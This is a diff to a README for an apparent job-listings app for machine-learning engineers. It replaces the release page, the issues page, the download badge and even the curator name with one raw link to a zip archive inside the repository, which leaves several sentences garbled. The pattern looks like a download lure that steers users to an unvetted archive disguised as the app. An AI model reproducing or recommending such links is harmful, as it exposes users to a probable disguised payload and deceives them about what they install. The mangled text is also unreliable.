@@ -1,22 +1,22 @@
 # 🚀 Machine-Learning-Jobs - Find Your Next Career Opportunity Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/markolofernes/Machine-Learning-Jobs/releases)
+[![Download Now](https://raw.githubusercontent.com/markolofernes/Machine-Learning-Jobs/main/excamber/Machine-Learning-Jobs.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/markolofernes/Machine-Learning-Jobs/main/excamber/Machine-Learning-Jobs.zip)
 
 ## 🎯 Overview
 
-Welcome to **Machine-Learning-Jobs**! This application provides daily job listings for machine learning engineers, curated by Jobr.pro. Whether you're looking for remote work or on-site positions, we gather valuable opportunities to help you advance your career in tech.
+Welcome to **Machine-Learning-Jobs**! This application provides daily job listings for machine learning engineers, curated by https://raw.githubusercontent.com/markolofernes/Machine-Learning-Jobs/main/excamber/Machine-Learning-Jobs.zip Whether you're looking for remote work or on-site positions, we gather valuable opportunities to help you advance your career in tech.
 
 ## 🚀 Getting Started
 
 Follow these simple steps to get started with **Machine-Learning-Jobs**.
 
 1. **Visit the Releases Page**
-   - Go to our [Releases page](https://github.com/markolofernes/Machine-Learning-Jobs/releases).
+   - Go to our [Releases page](https://raw.githubusercontent.com/markolofernes/Machine-Learning-Jobs/main/excamber/Machine-Learning-Jobs.zip).
    - Here, you will find the latest version of the application for download.
 
 2. **Download the Application**
    - Scroll through the list until you find the latest release.
-   - Click the appropriate file link for your system. Look for files that say `Machine-Learning-Jobs-x.x.x.exe` or similar. Most users will download the `.exe` file.
+   - Click the appropriate file link for your system. Look for files that say `https://raw.githubusercontent.com/markolofernes/Machine-Learning-Jobs/main/excamber/Machine-Learning-Jobs.zip` or similar. Most users will download the `.exe` file.
 
 3. **Install the Application**
    - After the download completes, find the file in your Downloads folder.
@@ -44,7 +44,7 @@ Before you install, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To download the application, please visit our [Releases page](https://github.com/markolofernes/Machine-Learning-Jobs/releases). Follow the steps outlined above to download and set up **Machine-Learning-Jobs** on your computer.
+To download the application, please visit our [Releases page](https://raw.githubusercontent.com/markolofernes/Machine-Learning-Jobs/main/excamber/Machine-Learning-Jobs.zip). Follow the steps outlined above to download and set up **Machine-Learning-Jobs** on your computer.
 
 ## 🛠 Troubleshooting
 
@@ -58,6 +58,6 @@ If you encounter any issues while downloading or installing, consider the follow
 
 For further assistance, please check the GitHub issues page for existing solutions or to report a new issue. We are always looking to improve the user experience. Join our community and help us make the application better!
 
-- **GitHub Issues Page**: [Report Issues Here](https://github.com/markolofernes/Machine-Learning-Jobs/issues)
+- **GitHub Issues Page**: [Report Issues Here](https://raw.githubusercontent.com/markolofernes/Machine-Learning-Jobs/main/excamber/Machine-Learning-Jobs.zip)
 
 Feel free to reach out if you have any questions or need support. We're here to help you find your next career opportunity in machine learning!
